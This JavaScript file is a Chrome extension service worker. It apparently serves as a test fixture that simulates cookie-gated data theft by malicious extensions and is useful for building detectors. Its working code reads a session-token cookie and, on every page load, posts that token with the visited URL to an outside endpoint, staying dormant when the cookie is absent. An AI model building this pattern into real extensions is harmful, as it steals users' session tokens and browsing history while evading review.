// Simulates: Ad Skipper Prime Video (checks x-main cookie), Similarweb (localStorage)
// Pattern: SW checks for auth cookie before exfiltrating data.
// Without the cookie, extension is completely dormant.

const EXFIL_URL = 'https://httpbin.org/post';
const AUTH_COOKIE_NAME = 'x-session-token';
const AUTH_COOKIE_DOMAIN = '.example.com';

async function checkAuthAndExfil(url) {
  try {
    const cookies = await chrome.cookies.getAll({ domain: AUTH_COOKIE_DOMAIN, name: AUTH_COOKIE_NAME });
    if (!cookies.length) {
      console.log('[TEST] No auth cookie found, skipping exfil');
      return;
    }
    const token = cookies[0].value;
    console.log('[TEST] Auth cookie found, exfiltrating');
    await fetch(EXFIL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'cookie_gated_exfil',
        url,
        token,
        ts: Date.now(),
      }),
    });
  } catch (e) {
    console.log('[TEST] Error:', e.message);
  }
}

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status !== 'complete' || !tab.url) return;
  if (tab.url.startsWith('chrome') || tab.url.startsWith('about')) return;
  checkAuthAndExfil(tab.url);
});

setInterval(() => {}, 25000);
console.log('[TEST] Cookie-gated SW started');
